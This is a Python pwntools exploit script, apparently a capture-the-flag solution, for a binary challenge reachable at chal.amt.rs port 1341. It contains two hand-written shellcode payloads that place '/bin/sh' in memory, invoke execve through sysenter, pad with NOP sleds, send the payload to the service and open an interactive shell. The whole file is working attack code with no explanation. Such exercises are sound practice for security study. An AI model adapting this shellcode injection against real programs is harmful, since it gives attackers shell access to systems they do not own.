#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal.amt.rs', 1341

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+474
'''.format(**locals())
# break *0x1337000

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./lib'

def skill_issue_exploit():
    global io
    io = initialize()

    shellcode = b''
    shellcode += b'\x90' * 8

    shellcode += asm(f'''
        movd rdi, xmm0
        movd rsp, xmm1
        movd rbp, xmm1
                     
        mov dword ptr [rdi], 0x6e69622f
        add rdi, 4
                     
        mov dword ptr [rdi], 0x0068732f
        sub rdi, 4
    ''')

    shellcode += asm(f'''
        mov rbx, rdi
        xor ecx, ecx
        xor edx, edx
                        
        mov eax, 11
        sysenter
    ''')

    payload = shellcode.ljust(0x1000, b'\x90')

    io.sendafter(b'>', payload)

    io.interactive()

def working_exploit():
    global io
    io = initialize()

    shellcode = b''
    shellcode += b'\x90' * 8

    shellcode += asm(f'''
        mov r10, rax
        add r10, 0x12d
                        
        mov r12, r10
        add r12, 0x100
        mov rbp, r12
    ''')

    shellcode += asm(f'''
        mov rbx, r10
        xor ecx, ecx
        xor edx, edx
                        
        mov eax, 11
        sysenter
    ''')

    shellcode += shellcode.ljust(0x100, b'\x90')
    shellcode += b'/bin/sh\x00'

    payload = shellcode.ljust(0x1000, b'\x90')

    io.sendafter(b'>', payload)

    io.interactive()
    
if __name__ == '__main__':
    working_exploit()
    # skill_issue_exploit()
